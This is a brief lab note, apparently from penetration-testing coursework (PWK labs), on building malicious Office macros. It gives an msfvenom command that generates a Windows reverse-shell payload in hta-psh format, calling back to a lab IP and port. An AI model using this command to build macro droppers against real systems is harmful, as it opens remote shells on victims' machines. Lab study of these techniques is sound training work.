# Macro Creation

vba-psh does not seem to be working during PWK Labs

Instead, we can use hta-psh and do the similar process of making it a macro

> msfvenom -p windows/shell\_reverse\_tcp LHOST=192.168.119.206 LPORT=5001 -f hta-psh
